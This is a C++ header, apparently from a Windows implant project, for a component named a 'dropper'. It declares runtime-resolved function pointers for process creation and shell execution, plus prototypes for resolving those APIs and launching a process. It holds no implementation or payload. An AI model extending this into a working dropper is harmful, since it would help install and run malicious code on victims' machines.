#pragma once

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <shellapi.h>
#include "logger.hpp"
#include "handler_util.hpp"

#define FAIL_LOAD_SHELL32 0x57001
#define FAIL_GET_CREATEDIRECTORYW 0x57002
#define FAIL_GET_SHELLEXECUTEW 0x57003
#define FAIL_GET_WAITFORSINGLEOBJECT 0x57004
#define FAIL_GET_GETEXITCODEPROCESS 0x57005

using CreateDirectoryW_t = decltype(&CreateDirectoryW);
using ShellExecuteW_t = decltype(&ShellExecuteW);
using WaitForSingleObject_t = decltype(&WaitForSingleObject);
using GetExitCodeProcess_t = decltype(&GetExitCodeProcess);

struct dropper_func_pointers {
    shared_func_pointers shared_fp;
    ShellExecuteW_t fp_ShellExecuteW;
    CreateDirectoryW_t fp_CreateDirectoryW;
    GetModuleFileNameW_t fp_GetModuleFileNameW;
    CreateProcessW_t fp_CreateProcessW;
    WaitForSingleObject_t fp_WaitForSingleObject;
    GetExitCodeProcess_t fp_GetExitCodeProcess;
};

void ConcatToParent(wchar_t* path, size_t buf_size_wchar, const wchar_t* to_append);

DWORD ResolveDropperAPIs(dropper_func_pointers* fp, logger_ctx* log_ctx);

DWORD CreateAndWaitForProcess(
    dropper_func_pointers* fp,
    logger_ctx* log_ctx,
    LPWSTR cmd,
    DWORD* exit_code
);
